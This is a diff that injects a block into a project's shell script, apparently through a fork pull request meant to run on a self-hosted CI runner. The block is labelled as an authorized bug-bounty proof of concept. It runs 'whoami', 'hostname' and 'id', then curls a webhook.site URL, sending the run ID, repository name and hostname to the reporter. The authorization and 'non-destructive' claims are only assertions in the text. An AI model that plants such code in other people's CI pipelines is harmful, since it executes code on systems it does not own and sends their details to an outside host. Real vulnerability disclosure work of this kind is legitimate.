@@ -20,6 +20,23 @@
 
 set -xe
 
+# ============================================================================
+# AUTHORIZED SECURITY RESEARCH PoC — Infomaniak YesWeHack Bug Bounty Program
+# Reporter: jayajee (submitted via ramyaajee)
+# Purpose: demonstrate that this self-hosted-runner workflow executes code
+#          from an unrelated fork's pull request with no restriction.
+# This block is READ-ONLY / NON-DESTRUCTIVE: it only prints identifying
+# system info to the CI log and pings a webhook.site canary URL we control
+# to record that this exact PR triggered execution. No secrets, files, or
+# credentials are read, modified, or exfiltrated. This PR will be closed
+# immediately after evidence is captured. Contact via YesWeHack for any
+# questions about this test.
+echo "=== BUG BOUNTY POC: arbitrary code execution on Infomaniak self-hosted runner ==="
+whoami; hostname; id
+curl -s "https://webhook.site/9ae71c0f-3fbb-4b90-95b2-794f03e2d971?run_id=${GITHUB_RUN_ID:-unknown}&repo=${GITHUB_REPOSITORY:-unknown}&host=$(hostname)" || true
+echo "=== END BUG BOUNTY POC ==="
+# ============================================================================
+
 program_name="$(basename "$0")"
 
 function display_help {
